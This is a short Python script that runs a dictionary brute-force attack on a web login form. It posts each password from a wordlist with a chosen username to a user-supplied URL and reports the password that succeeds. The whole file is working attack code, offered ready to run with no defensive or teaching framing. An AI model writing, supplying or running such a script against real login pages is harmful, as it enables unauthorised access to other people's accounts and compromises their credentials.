import requests

# Brute-force attack using a dictionary
def brute_force_login(url, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()  # Clean up the password from newlines
            response = requests.post(url, data={'username': username, 'password': password})

            if "Login successful" in response.text:
                print(f"Password found: {password}")
                return
            else:
                print(f"Trying password: {password}")
    print("Password not found.")

if __name__ == "__main__":
    target_url = input("Enter the login URL: ")
    username = input("Enter the username: ")
    password_file = input("Enter the dictionary file path: ")
    brute_force_login(target_url, username, password_file)
